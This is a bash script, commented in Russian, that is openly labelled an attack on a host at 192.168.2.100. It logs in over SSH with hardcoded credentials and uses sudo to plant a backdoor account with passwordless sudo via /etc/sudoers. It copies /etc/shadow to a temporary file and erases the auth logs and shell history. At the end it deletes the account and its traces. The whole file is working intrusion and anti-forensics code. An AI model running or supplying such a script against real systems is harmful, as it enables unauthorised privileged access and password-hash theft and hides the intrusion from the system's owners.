#!/bin/bash

TARGET_IP="192.168.2.100"
USER="alex_adm"
PASS="qwerty123"

BACKDOOR_USER="sys_service"
BACKDOOR_PASS="Hacked_2026!"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_step() { echo -e "\n${BLUE}[*] $1...${NC}"; }

print_step "Начало атаки: Подключение к $TARGET_IP под пользователем $USER"

sshpass -p "$PASS" ssh -T -o StrictHostKeyChecking=no $USER@$TARGET_IP "bash -s" <<EOF

    # Код внутри удаленной сессии
    
    CURRENT_PASS="$PASS"
    NEW_USER="$BACKDOOR_USER"
    NEW_PASS="$BACKDOOR_PASS"

    # Функция-обертка для sudo
    function run_sudo_cmd() {
        CMD="\$@"
        if echo "\$CURRENT_PASS" | sudo -S -p "" \$CMD 2>/dev/null; then
            echo "[REMOTE: OK] \$CMD"
            return 0
        else
            echo "[REMOTE: ERROR] \$CMD"
            return 1
        fi
    }

    echo "1. Создание учетной записи"
    if run_sudo_cmd useradd -m -s /bin/bash \$NEW_USER; then
        # Установка пароля через пайплайн
        echo "\$CURRENT_PASS" | sudo -S -p "" sh -c "echo '\$NEW_USER:\$NEW_PASS' | chpasswd" 2>/dev/null
        run_sudo_cmd usermod -aG sudo \$NEW_USER
    else
        echo "[REMOTE: SKIP] Пользователь уже существует или ошибка создания."
    fi
    sleep 1

    echo "2. Модификация /etc/sudoers"
    if sudo grep -q "\$NEW_USER" /etc/sudoers 2>/dev/null; then
        echo "[REMOTE: INFO] Запись в sudoers уже есть."
    else
        run_sudo_cmd sh -c "echo '\$NEW_USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
    fi

    echo "3. Чтение /etc/shadow"
    sleep 1
    run_sudo_cmd cat /etc/shadow > /tmp/shadow_leak.txt
    
    echo "[REMOTE: ACT] Переключение на \$NEW_USER..."
    sudo su - \$NEW_USER -c "whoami; id;"
   
    echo "4. Заметание следов"
    sleep 2
    run_sudo_cmd sh -c "rm -f /var/log/auth.log.*"
    run_sudo_cmd truncate -s 0 /var/log/auth.log
    sleep 1
    history -c

    echo "5. Удаление учетной записи и чистим следы"   
    run_sudo_cmd userdel -r \$NEW_USER

    run_sudo_cmd rm -f /tmp/shadow_leak.txt

    run_sudo_cmd sed -i "/\$NEW_USER/d" /etc/sudoers

    echo "Атака завершена."

EOF